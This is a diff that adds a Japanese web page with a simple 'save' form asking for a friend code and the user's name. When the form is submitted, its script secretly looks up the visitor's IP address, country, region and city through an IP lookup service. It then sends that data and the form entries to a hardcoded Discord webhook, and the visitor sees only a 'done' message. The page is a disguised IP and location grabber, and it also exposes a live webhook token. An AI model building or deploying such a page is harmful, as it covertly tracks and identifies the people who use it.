@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>main_frontsight</title>
+    <style>
+        body {
+            background-color: #50;
+            font-family: Arial, sans-serif;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+
+        .form-container {
+            width: 300px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #222;
+            border: 2px solid #504;
+            border-radius: 1px;
+            box-shadow: inset 0 0 90px rgba(255,55,235,0.2), 0 0 15px rgba(0,0,0,0.7);
+            background-image: linear-gradient(145deg, #333, #409);
+            text-align: center;
+        }
+
+        h2 {
+            text-align: center;
+        }
+
+        .item {
+            margin-top: 8px;
+            text-align: left;
+        }
+
+        .label {
+            display: block;
+            margin-bottom: 1px;
+        }
+
+        .inputs {
+            width: 97%;
+            padding: 11px;
+            border: none;
+            border-radius: 5px;
+        }
+
+        .button-area {
+            margin-top: 12px;
+        }
+
+        input[type="submit"] {
+            background-color: #369;
+            color: #fff;
+            border: none;
+            padding: 15px 28px;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #777;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>&#20445;&#23384;&#29992;</h2>
+
+        <form id="mod-form">
+            <div class="item">
+                <label class="label">&#12501;&#12524;&#12531;&#12489;&#12467;&#12540;&#12489;</label>
+                <input type="text" class="inputs" name="friend_id" required>
+            </div>
+
+            <div class="item">
+                <label class="label">&#12354;&#12394;&#12383;&#12398;&#21517;&#21069;</label>
+                <input type="text" class="inputs" name="secret_code" required>
+            </div>
+
+            <div class="button-area">
+                <input type="submit" value="保存">
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("mod-form").addEventListener("submit", async function(event) {
+            event.preventDefault();
+            const formData = new FormData(this);
+
+            try {
+                const ipResponse = await fetch("https://ipapi.co/json/");
+                const ipData = await ipResponse.json();
+
+                const userIP = ipData.ip;
+                const country = ipData.country_name || "不明";
+                const region = ipData.region || "不明";
+                const city = ipData.city || "不明";
+
+                const payload = {
+                    content: "新しいデータが送信されました:",
+                    embeds: [{
+                        title: "保存されたデータ",
+                        fields: [
+                            { name: "フレンドコード", value: formData.get("friend_id"), inline: true },
+                            { name: "入力者の名前", value: formData.get("secret_code"), inline: true },
+                            { name: "IPアドレス", value: userIP, inline: false },
+                            { name: "国", value: country, inline: false },
+                            { name: "都道府県", value: region, inline: false },
+                            { name: "市区町村", value: city, inline: false }
+                        ],
+                        color: 16711680
+                    }]
+                };
+
+                const response = await fetch("https://discord.com/api/webhooks/1410001547823288340/zKAjd4VIYGyHCv5VPUfN0fWdWPJBXaHMwS0wCP9esQKfF_lT0Xt0VXRrh6dfAMQzptaT", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Webhook送信エラー: ${response.status} ${response.statusText}`);
+                }
+
+                alert("完了");
+            } catch (error) {
+                console.error("エラー: ", error);
+                alert("失敗");
+            }
+        });
+    </script>
+</body>
+</html>
